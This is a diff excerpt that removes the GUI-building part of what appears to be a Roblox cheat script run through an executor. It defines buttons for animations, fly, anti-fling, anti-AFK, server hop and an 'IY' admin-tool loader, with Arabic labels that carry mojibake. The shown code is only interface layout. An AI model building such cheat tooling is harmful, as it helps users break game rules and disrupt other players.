-    getgenv().SaluteAnimationR15.BorderSizePixel = 0
-    getgenv().SaluteAnimationR15.Position = UDim2.new(0, 25, 0, 25)
-    getgenv().SaluteAnimationR15.Size = UDim2.new(0, 150, 0, 30)
-    getgenv().SaluteAnimationR15.Font = Enum.Font.Oswald
-    getgenv().SaluteAnimationR15.Text = "\239\191\189\216\173\217\138\216\169 (R15)"
-    getgenv().SaluteAnimationR15.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().SaluteAnimationR15.TextScaled = true
-    getgenv().SaluteAnimationR15.TextSize = 14
-    getgenv().SaluteAnimationR15.TextWrapped = true
-    getgenv().DoggyAnimationR15.Name = "DoggyAnimationR15"
-    getgenv().DoggyAnimationR15.Parent = vu277
-    getgenv().DoggyAnimationR15.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().DoggyAnimationR15.BackgroundTransparency = 0.5
-    getgenv().DoggyAnimationR15.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().DoggyAnimationR15.BorderSizePixel = 0
-    getgenv().DoggyAnimationR15.Position = UDim2.new(0, 25, 0, 75)
-    getgenv().DoggyAnimationR15.Size = UDim2.new(0, 150, 0, 30)
-    getgenv().DoggyAnimationR15.Font = Enum.Font.Oswald
-    getgenv().DoggyAnimationR15.Text = "\239\191\189\217\132\216\168 (R15)"
-    getgenv().DoggyAnimationR15.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().DoggyAnimationR15.TextScaled = true
-    getgenv().DoggyAnimationR15.TextSize = 14
-    getgenv().DoggyAnimationR15.TextWrapped = true
-    getgenv().Sb3awyAnimationR15.Name = "Sb3awyAnimationR15"
-    getgenv().Sb3awyAnimationR15.Parent = vu277
-    getgenv().Sb3awyAnimationR15.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().Sb3awyAnimationR15.BackgroundTransparency = 0.5
-    getgenv().Sb3awyAnimationR15.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().Sb3awyAnimationR15.BorderSizePixel = 0
-    getgenv().Sb3awyAnimationR15.Position = UDim2.new(0, 25, 0, 325)
-    getgenv().Sb3awyAnimationR15.Size = UDim2.new(0, 150, 0, 30)
-    getgenv().Sb3awyAnimationR15.Font = Enum.Font.Oswald
-    getgenv().Sb3awyAnimationR15.Text = "\239\191\189\216\168\216\185\216\167\217\136\217\138 (R15)"
-    getgenv().Sb3awyAnimationR15.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().Sb3awyAnimationR15.TextScaled = true
-    getgenv().Sb3awyAnimationR15.TextSize = 14
-    getgenv().Sb3awyAnimationR15.TextWrapped = true
-    getgenv().ZombieWalkAnimationR15.Name = "ZombieWalkAnimationR15"
-    getgenv().ZombieWalkAnimationR15.Parent = vu277
-    getgenv().ZombieWalkAnimationR15.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().ZombieWalkAnimationR15.BackgroundTransparency = 0.5
-    getgenv().ZombieWalkAnimationR15.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().ZombieWalkAnimationR15.BorderSizePixel = 0
-    getgenv().ZombieWalkAnimationR15.Position = UDim2.new(0, 25, 0, 425)
-    getgenv().ZombieWalkAnimationR15.Size = UDim2.new(0, 150, 0, 30)
-    getgenv().ZombieWalkAnimationR15.Font = Enum.Font.Oswald
-    getgenv().ZombieWalkAnimationR15.Text = "\239\191\189\217\136\217\133\216\168\217\138 (R15)"
-    getgenv().ZombieWalkAnimationR15.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().ZombieWalkAnimationR15.TextScaled = true
-    getgenv().ZombieWalkAnimationR15.TextSize = 14
-    getgenv().ZombieWalkAnimationR15.TextWrapped = true
-    getgenv().FlingArmsAnimationR15.Name = "FlingArmsAnimationR15"
-    getgenv().FlingArmsAnimationR15.Parent = vu277
-    getgenv().FlingArmsAnimationR15.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().FlingArmsAnimationR15.BackgroundTransparency = 0.5
-    getgenv().FlingArmsAnimationR15.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().FlingArmsAnimationR15.BorderSizePixel = 0
-    getgenv().FlingArmsAnimationR15.Position = UDim2.new(0, 25, 0, 475)
-    getgenv().FlingArmsAnimationR15.Size = UDim2.new(0, 150, 0, 30)
-    getgenv().FlingArmsAnimationR15.Font = Enum.Font.Oswald
-    getgenv().FlingArmsAnimationR15.Text = "\239\191\189\216\183\217\133 (R15)"
-    getgenv().FlingArmsAnimationR15.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().FlingArmsAnimationR15.TextScaled = true
-    getgenv().FlingArmsAnimationR15.TextSize = 14
-    getgenv().FlingArmsAnimationR15.TextWrapped = true
-    getgenv().AhmAhmAnimationR15.Name = "AhmAhmAnimationR15"
-    getgenv().AhmAhmAnimationR15.Parent = vu277
-    getgenv().AhmAhmAnimationR15.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().AhmAhmAnimationR15.BackgroundTransparency = 0.5
-    getgenv().AhmAhmAnimationR15.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().AhmAhmAnimationR15.BorderSizePixel = 0
-    getgenv().AhmAhmAnimationR15.Position = UDim2.new(0, 25, 0, 525)
-    getgenv().AhmAhmAnimationR15.Size = UDim2.new(0, 150, 0, 30)
-    getgenv().AhmAhmAnimationR15.Font = Enum.Font.Oswald
-    getgenv().AhmAhmAnimationR15.Text = "\239\191\189\216\173\217\133 (R15)"
-    getgenv().AhmAhmAnimationR15.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().AhmAhmAnimationR15.TextScaled = true
-    getgenv().AhmAhmAnimationR15.TextSize = 14
-    getgenv().AhmAhmAnimationR15.TextWrapped = true
-    getgenv().DolphinAnimationR15.Name = "DolphinAnimationR15"
-    getgenv().DolphinAnimationR15.Parent = vu277
-    getgenv().DolphinAnimationR15.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().DolphinAnimationR15.BackgroundTransparency = 0.5
-    getgenv().DolphinAnimationR15.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().DolphinAnimationR15.BorderSizePixel = 0
-    getgenv().DolphinAnimationR15.Position = UDim2.new(0, 25, 0, 375)
-    getgenv().DolphinAnimationR15.Size = UDim2.new(0, 150, 0, 30)
-    getgenv().DolphinAnimationR15.Font = Enum.Font.Oswald
-    getgenv().DolphinAnimationR15.Text = "\239\191\189\217\136\217\132\217\129\217\138\217\134 (R15)"
-    getgenv().DolphinAnimationR15.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().DolphinAnimationR15.TextScaled = true
-    getgenv().DolphinAnimationR15.TextSize = 14
-    getgenv().DolphinAnimationR15.TextWrapped = true
-    getgenv().SleepyAnimationR15.Name = "SleepyAnimationR15"
-    getgenv().SleepyAnimationR15.Parent = vu277
-    getgenv().SleepyAnimationR15.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().SleepyAnimationR15.BackgroundTransparency = 0.5
-    getgenv().SleepyAnimationR15.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().SleepyAnimationR15.BorderSizePixel = 0
-    getgenv().SleepyAnimationR15.Position = UDim2.new(0, 25, 0, 125)
-    getgenv().SleepyAnimationR15.Size = UDim2.new(0, 150, 0, 30)
-    getgenv().SleepyAnimationR15.Font = Enum.Font.Oswald
-    getgenv().SleepyAnimationR15.Text = "\239\191\189\216\167\216\166\217\133 (R15)"
-    getgenv().SleepyAnimationR15.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().SleepyAnimationR15.TextScaled = true
-    getgenv().SleepyAnimationR15.TextSize = 14
-    getgenv().SleepyAnimationR15.TextWrapped = true
-    getgenv().HugAnimationR15.Name = "HugAnimationR15"
-    getgenv().HugAnimationR15.Parent = vu277
-    getgenv().HugAnimationR15.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().HugAnimationR15.BackgroundTransparency = 0.5
-    getgenv().HugAnimationR15.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().HugAnimationR15.BorderSizePixel = 0
-    getgenv().HugAnimationR15.Position = UDim2.new(0, 25, 0, 175)
-    getgenv().HugAnimationR15.Size = UDim2.new(0, 150, 0, 30)
-    getgenv().HugAnimationR15.Font = Enum.Font.Oswald
-    getgenv().HugAnimationR15.Text = "\239\191\189\216\182\217\134 (R15)"
-    getgenv().HugAnimationR15.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().HugAnimationR15.TextScaled = true
-    getgenv().HugAnimationR15.TextSize = 14
-    getgenv().HugAnimationR15.TextWrapped = true
-    getgenv().CrazyAnimationR15.Name = "CrazyAnimationR15"
-    getgenv().CrazyAnimationR15.Parent = vu277
-    getgenv().CrazyAnimationR15.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().CrazyAnimationR15.BackgroundTransparency = 0.5
-    getgenv().CrazyAnimationR15.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().CrazyAnimationR15.BorderSizePixel = 0
-    getgenv().CrazyAnimationR15.Position = UDim2.new(0, 25, 0, 225)
-    getgenv().CrazyAnimationR15.Size = UDim2.new(0, 150, 0, 30)
-    getgenv().CrazyAnimationR15.Font = Enum.Font.Oswald
-    getgenv().CrazyAnimationR15.Text = "\239\191\189\216\174\216\168\217\132 (R15)"
-    getgenv().CrazyAnimationR15.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().CrazyAnimationR15.TextScaled = true
-    getgenv().CrazyAnimationR15.TextSize = 14
-    getgenv().CrazyAnimationR15.TextWrapped = true
-    getgenv().B3b3AnimationR15.Name = "B3b3AnimationR15"
-    getgenv().B3b3AnimationR15.Parent = vu277
-    getgenv().B3b3AnimationR15.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().B3b3AnimationR15.BackgroundTransparency = 0.5
-    getgenv().B3b3AnimationR15.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().B3b3AnimationR15.BorderSizePixel = 0
-    getgenv().B3b3AnimationR15.Position = UDim2.new(0, 25, 0, 275)
-    getgenv().B3b3AnimationR15.Size = UDim2.new(0, 150, 0, 30)
-    getgenv().B3b3AnimationR15.Font = Enum.Font.Oswald
-    getgenv().B3b3AnimationR15.Text = "\239\191\189\216\185\216\168\216\185 (R15)"
-    getgenv().B3b3AnimationR15.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().B3b3AnimationR15.TextScaled = true
-    getgenv().B3b3AnimationR15.TextSize = 14
-    getgenv().B3b3AnimationR15.TextWrapped = true
-    v299.Name = "Chose_Animation_Button1"
-    v299.Parent = vu278
-    v299.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v299.BackgroundTransparency = 0.5
-    v299.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v299.BorderSizePixel = 0
-    v299.Position = UDim2.new(0, 25, 0, 100)
-    v299.Size = UDim2.new(0, 150, 0, 60)
-    v299.Font = Enum.Font.Oswald
-    v299.Text = "\239\191\189\217\134\217\133\217\138\216\180\217\134 \216\173\216\177\217\131\216\167\216\170\n" .. utf8.char(128378, 127995)
-    v299.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v299.TextScaled = true
-    v299.TextSize = 14
-    v299.TextWrapped = true
-    v300.Name = "Chose_Animation_Button2"
-    v300.Parent = vu278
-    v300.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v300.BackgroundTransparency = 0.5
-    v300.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v300.BorderSizePixel = 0
-    v300.Position = UDim2.new(0, 210, 0, 100)
-    v300.Size = UDim2.new(0, 150, 0, 60)
-    v300.Font = Enum.Font.Oswald
-    v300.Text = "\239\191\189\217\134\217\133\217\138\216\180\217\134 \217\133\217\138\216\180\216\167\216\170\n" .. utf8.char(128694, 127995) .. utf8.char(8205) .. utf8.char(9794, 65039)
-    v300.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v300.TextScaled = true
-    v300.TextSize = 14
-    v300.TextWrapped = true
-    v307.Name = "Misc_Section"
-    v307.Parent = vu221
-    v307.Active = true
-    v307.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    v307.BackgroundTransparency = 1
-    v307.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v307.BorderSizePixel = 0
-    v307.Position = UDim2.new(0, 105, 0, 30)
-    v307.Size = UDim2.new(0, 395, 0, 320)
-    v307.Visible = false
-    v307.CanvasSize = UDim2.new(0, 0, 1.05, 0)
-    v307.ScrollBarThickness = 5
-    vu308.Name = "AntiFling_Button"
-    vu308.Parent = v307
-    vu308.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu308.BackgroundTransparency = 0.5
-    vu308.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu308.BorderSizePixel = 0
-    vu308.Position = UDim2.new(0, 25, 0, 25)
-    vu308.Size = UDim2.new(0, 150, 0, 30)
-    vu308.Font = Enum.Font.Oswald
-    vu308.Text = "\239\191\189\216\182\216\167\216\175 \217\129\217\132\217\134\217\130"
-    vu308.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu308.TextScaled = true
-    vu308.TextSize = 14
-    vu308.TextWrapped = true
-    vu310.Name = "AntiAFK_Button"
-    vu310.Parent = v307
-    vu310.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu310.BackgroundTransparency = 0.5
-    vu310.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu310.BorderSizePixel = 0
-    vu310.Position = UDim2.new(0, 25, 0, 75)
-    vu310.Size = UDim2.new(0, 150, 0, 30)
-    vu310.Font = Enum.Font.Oswald
-    vu310.Text = "\239\191\189\216\182\216\167\216\175 \216\167\217\129\217\131"
-    vu310.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu310.TextScaled = true
-    vu310.TextSize = 14
-    vu310.TextWrapped = true
-    vu309.Name = "AntiChatSpy_Button"
-    vu309.Parent = v307
-    vu309.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu309.BackgroundTransparency = 0.5
-    vu309.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu309.BorderSizePixel = 0
-    vu309.Position = UDim2.new(0, 210, 0, 25)
-    vu309.Size = UDim2.new(0, 150, 0, 30)
-    vu309.Font = Enum.Font.Oswald
-    vu309.Text = "\239\191\189\216\182\216\167\216\175 \216\167\216\186\216\170\216\181\216\167\216\168"
-    vu309.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu309.TextScaled = true
-    vu309.TextSize = 14
-    vu309.TextWrapped = true
-    vu311.Name = "Shaders_Button"
-    vu311.Parent = v307
-    vu311.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu311.BackgroundTransparency = 0.5
-    vu311.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu311.BorderSizePixel = 0
-    vu311.Position = UDim2.new(0, 210, 0, 75)
-    vu311.Size = UDim2.new(0, 150, 0, 30)
-    vu311.Font = Enum.Font.Oswald
-    vu311.Text = "\239\191\189\216\167\216\175\216\177 "
-    vu311.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu311.TextScaled = true
-    vu311.TextSize = 14
-    vu311.TextWrapped = true
-    v312.Name = "Day_Button"
-    v312.Parent = v307
-    v312.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v312.BackgroundTransparency = 0.5
-    v312.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v312.BorderSizePixel = 0
-    v312.Position = UDim2.new(0, 25, 0, 125)
-    v312.Size = UDim2.new(0, 150, 0, 30)
-    v312.Font = Enum.Font.Oswald
-    v312.Text = "\239\191\189\216\168\216\167\216\173"
-    v312.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v312.TextScaled = true
-    v312.TextSize = 14
-    v312.TextWrapped = true
-    v313.Name = "Night_Button"
-    v313.Parent = v307
-    v313.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v313.BackgroundTransparency = 0.5
-    v313.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v313.BorderSizePixel = 0
-    v313.Position = UDim2.new(0, 210, 0, 125)
-    v313.Size = UDim2.new(0, 150, 0, 30)
-    v313.Font = Enum.Font.Oswald
-    v313.Text = "\239\191\189\217\138\217\132"
-    v313.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v313.TextScaled = true
-    v313.TextSize = 14
-    v313.TextWrapped = true
-    v314.Name = "Rejoin_Button"
-    v314.Parent = v307
-    v314.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v314.BackgroundTransparency = 0.5
-    v314.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v314.BorderSizePixel = 0
-    v314.Position = UDim2.new(0, 25, 0, 225)
-    v314.Size = UDim2.new(0, 150, 0, 30)
-    v314.Font = Enum.Font.Oswald
-    v314.Text = "\239\191\189\216\185\216\167\216\175\216\169 \216\167\217\132\216\167\217\134\216\182\217\133\216\167\217\133"
-    v314.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v314.TextScaled = true
-    v314.TextSize = 14
-    v314.TextWrapped = true
-    v315.Name = "InfYield_Button"
-    v315.Parent = v307
-    v315.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v315.BackgroundTransparency = 0.5
-    v315.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v315.BorderSizePixel = 0
-    v315.Position = UDim2.new(0, 25, 0, 175)
-    v315.Size = UDim2.new(0, 150, 0, 30)
-    v315.Font = Enum.Font.Oswald
-    v315.Text = "\239\191\189\216\175\217\133\217\134 IY"
-    v315.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v315.TextScaled = true
-    v315.TextSize = 14
-    v315.TextWrapped = true
-    v318.Name = "FreeEmotes_Button"
-    v318.Parent = v307
-    v318.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v318.BackgroundTransparency = 0.5
-    v318.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v318.BorderSizePixel = 0
-    v318.Position = UDim2.new(0, 210, 0, 175)
-    v318.Size = UDim2.new(0, 150, 0, 30)
-    v318.Font = Enum.Font.Oswald
-    v318.Text = "\239\191\189\217\130\216\181\216\167\216\170 \217\133\216\172\216\167\217\134\217\138\216\169"
-    v318.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v318.TextScaled = true
-    v318.TextSize = 14
-    v318.TextWrapped = true
-    v316.Name = "Serverhop_Button"
-    v316.Parent = v307
-    v316.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v316.BackgroundTransparency = 0.5
-    v316.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v316.BorderSizePixel = 0
-    v316.Position = UDim2.new(0, 210, 0, 225)
-    v316.Size = UDim2.new(0, 150, 0, 30)
-    v316.Font = Enum.Font.Oswald
-    v316.Text = "\239\191\189\216\186\217\138\217\138\216\177 \216\167\217\132\216\179\217\138\216\177\217\129\216\177"
-    v316.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v316.TextScaled = true
-    v316.TextSize = 14
-    v316.TextWrapped = true
-    v317.Name = "Ad_Button"
-    v317.Parent = v307
-    v317.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v317.BackgroundTransparency = 0.5
-    v317.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v317.BorderSizePixel = 0
-    v317.Position = UDim2.new(0, 25, 0, 263)
-    v317.Size = UDim2.new(0, 335, 0, 30)
-    v317.Font = Enum.Font.Oswald
-    v317.Text = "\239\191\189\217\131\216\177\216\168\216\170\216\167\216\170 \216\167\216\174\216\177\217\137"
-    v317.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v317.TextScaled = true
-    v317.TextSize = 14
-    v317.TextWrapped = true
-    vu319.Name = "ChatBox_Input"
-    vu319.Parent = v307
-    vu319.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    vu319.BorderColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu319.Position = UDim2.new(0, 25, 0, 298)
-    vu319.Size = UDim2.new(0, 335, 0, 60)
-    vu319.Font = Enum.Font.Oswald
-    vu319.PlaceholderText = "\239\191\189\216\180\217\129\217\138\216\177 \216\167\217\132\217\131\217\132\216\167\217\133 [\217\133\216\167\216\185\217\132\217\138\217\135\216\167 \216\168\216\167\217\134\216\175 \216\185\217\132\217\137 \216\182\217\133\216\167\217\134\216\170\217\138] .                                                                            "
-    vu319.Text = ""
-    vu319.TextColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu319.TextSize = 14
-    vu319.TextWrapped = true
-    vu319.TextXAlignment = Enum.TextXAlignment.Left
-    vu319.TextYAlignment = Enum.TextYAlignment.Top
-    v320.Name = "Credits_Section"
-    v320.Parent = vu221
-    v320.Active = true
-    v320.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    v320.BackgroundTransparency = 1
-    v320.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v320.BorderSizePixel = 0
-    v320.Position = UDim2.new(0, 105, 0, 30)
-    v320.Size = UDim2.new(0, 395, 0, 320)
-    v320.Visible = false
-    v320.CanvasSize = UDim2.new(0, 0, 0.8, 0)
-    v320.ScrollBarThickness = 5
-    v321.Name = "Credits_Label"
-    v321.Parent = v320
-    v321.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    v321.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v321.BorderSizePixel = 0
-    v321.Position = UDim2.new(0, 25, 0, 150)
-    v321.Size = UDim2.new(0, 350, 0, 150)
-    v321.Font = Enum.Font.SourceSans
-    v321.Text = "Made By : @i.vr7, @7sone \nDiscord: discord.gg/vr7\nLast Update: 2025/10/23\nVersion: " .. "v" .. vu28
-    v321.TextColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v321.TextSize = 24
-    v321.TextWrapped = true
-    v321.TextXAlignment = Enum.TextXAlignment.Left
-    v321.TextYAlignment = Enum.TextYAlignment.Top
-    v322.Name = "WhoWeAre_Button"
-    v322.Parent = v320
-    v322.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v322.BackgroundTransparency = 0.5
-    v322.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v322.BorderSizePixel = 0
-    v322.Position = UDim2.new(0, 40, 0, 255)
-    v322.Size = UDim2.new(0, 300, 0, 30)
-    v322.Font = Enum.Font.Oswald
-    v322.Text = "\239\191\189\217\134 \217\134\216\173\217\134\216\159"
-    v322.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v322.TextScaled = true
-    v322.TextSize = 14
-    v322.TextWrapped = true
-    v323.Name = "TrollFace"
-    v323.Parent = vu221
-    v323.AnchorPoint = Vector2.new(0.5, 0.44)
-    v323.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    v323.BackgroundTransparency = 1
-    v323.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v323.BorderSizePixel = 0
-    v323.Rotation = - 25
-    v323.ScaleType = Enum.ScaleType.Fit
-    v323.Size = UDim2.new(0, 121, 0, 102)
-    v323.Image = "rbxassetid://8776783827"
-    v323.ImageColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v324.Name = "Server Image"
-    v324.Parent = v320
-    v324.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    v324.BackgroundTransparency = 1
-    v324.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v324.BorderSizePixel = 0
-    v324.Size = UDim2.new(0, 350, 0, 130)
-    v324.Position = UDim2.new(0, 25, 0, 10)
-    v324.Image = "rbxassetid://136772242182146"
-    v324.ImageColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    local v344 = v240:Clone()
-    v344.Color = Color3.fromRGB(vu31, vu32, vu33)
-    v344.Parent = v324
-    v325.Name = "Assets"
-    v325.Parent = getgenv().VR7
-    vu326.Name = "Ticket_Asset"
-    vu326.Parent = v325
-    vu326.AnchorPoint = Vector2.new(0, 0.5)
-    vu326.BackgroundTransparency = 1
-    vu326.BorderSizePixel = 0
-    vu326.LayoutOrder = 5
-    vu326.Position = UDim2.new(1, 5, 0.5, 0)
-    vu326.Size = UDim2.new(0, 25, 0, 25)
-    vu326.ZIndex = 2
-    vu326.Image = "rbxassetid://3926305904"
-    vu326.ImageColor3 = Color3.fromRGB(255, 0, 0)
-    vu326.ImageRectOffset = Vector2.new(424, 4)
-    vu326.ImageRectSize = Vector2.new(36, 36)
-    vu327.Name = "Click_Asset"
-    vu327.Parent = v325
-    vu327.AnchorPoint = Vector2.new(0, 0.5)
-    vu327.BackgroundTransparency = 1
-    vu327.BorderSizePixel = 0
-    vu327.Position = UDim2.new(1, 5, 0.5, 0)
-    vu327.Size = UDim2.new(0, 25, 0, 25)
-    vu327.ZIndex = 2
-    vu327.Image = "rbxassetid://3926305904"
-    vu327.ImageColor3 = Color3.fromRGB(100, 100, 100)
-    vu327.ImageRectOffset = Vector2.new(204, 964)
-    vu327.ImageRectSize = Vector2.new(36, 36)
-    vu328.AngularVelocity = Vector3.new(0, 0, 0)
-    vu328.MaxTorque = Vector3.new(50000, 50000, 50000)
-    vu328.P = 1250
-    vu328.Name = "BreakVelocity"
-    vu328.Parent = v325
-    vu329.Name = "Fly_Pad"
-    vu329.Parent = v325
-    vu329.BackgroundTransparency = 1
-    vu329.Position = UDim2.new(0.1, 0, 0.6, 0)
-    vu329.Size = UDim2.new(0, 100, 0, 100)
-    vu329.ZIndex = 2
-    vu329.Image = "rbxassetid://6764432293"
-    vu329.ImageRectOffset = Vector2.new(713, 315)
-    vu329.ImageRectSize = Vector2.new(75, 75)
-    vu329.Visible = false
-    v330.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 30)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(vu31, vu32, vu33))
     })
-    v330.Rotation = 45
-    v330.Parent = vu329
-    v331.Name = "FlyAButton"
-    v331.Parent = vu329
-    v331.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    v331.BackgroundTransparency = 1
-    v331.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v331.BorderSizePixel = 0
-    v331.Position = UDim2.new(0, 0, 0, 30)
-    v331.Size = UDim2.new(0, 30, 0, 40)
-    v331.Font = Enum.Font.Oswald
-    v331.Text = ""
-    v331.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v331.TextSize = 25
-    v331.TextWrapped = true
-    v332.Name = "FlyDButton"
-    v332.Parent = vu329
-    v332.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    v332.BackgroundTransparency = 1
-    v332.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v332.BorderSizePixel = 0
-    v332.Position = UDim2.new(0, 70, 0, 30)
-    v332.Size = UDim2.new(0, 30, 0, 40)
-    v332.Font = Enum.Font.Oswald
-    v332.Text = ""
-    v332.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v332.TextSize = 25
-    v332.TextWrapped = true
-    v333.Name = "FlyWButton"
-    v333.Parent = vu329
-    v333.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    v333.BackgroundTransparency = 1
-    v333.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v333.BorderSizePixel = 0
-    v333.Position = UDim2.new(0, 30, 0, 0)
-    v333.Size = UDim2.new(0, 40, 0, 30)
-    v333.Font = Enum.Font.Oswald
-    v333.Text = ""
-    v333.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v333.TextSize = 25
-    v333.TextWrapped = true
-    v334.Name = "FlySButton"
-    v334.Parent = vu329
-    v334.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    v334.BackgroundTransparency = 1
-    v334.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v334.BorderSizePixel = 0
-    v334.Position = UDim2.new(0, 30, 0, 70)
-    v334.Size = UDim2.new(0, 40, 0, 30)
-    v334.Font = Enum.Font.Oswald
-    v334.Text = ""
-    v334.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v334.TextSize = 25
-    v334.TextWrapped = true
-    v335.Name = "OpenClose"
-    v335.Parent = getgenv().VR7
-    v335.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    v335.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v335.BorderSizePixel = 0
-    v335.Position = UDim2.new(0, 0, 0.5, 0)
-    v335.Size = UDim2.new(0, 30, 0, 30)
-    v335.ScaleType = Enum.ScaleType.Fit
-    v335.Image = "rbxassetid://8776783827"
-    v335.ImageColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v336.CornerRadius = UDim.new(1, 0)
-    v336.Parent = v335
-    function CreateRainbowTextLabel(p345, p346, p347, p348)
-        local v349 = Instance.new("TextLabel", p345)
-        v349.Text = p346
-        v349.Size = UDim2.new(0, 60, 0, 30)
-        v349.Position = p347
-        v349.TextColor3 = Color3.fromRGB(85, 255, 127)
-        v349.TextScaled = true
-        v349.Font = Enum.Font.SourceSans
-        v349.TextSize = 20
-        v349.TextTransparency = 0
-        v349.BackgroundTransparency = 1
-        v349.TextStrokeTransparency = 0.8
-        v349.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-        v349.Rotation = p348
-        return v349
-    end
-    function CreateButtonWithText(p350, p351, p352, p353, p354, p355)
-        local v356 = Instance.new("TextButton", p350)
-        v356.Name = p351
-        v356.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-        v356.BackgroundTransparency = 0.5
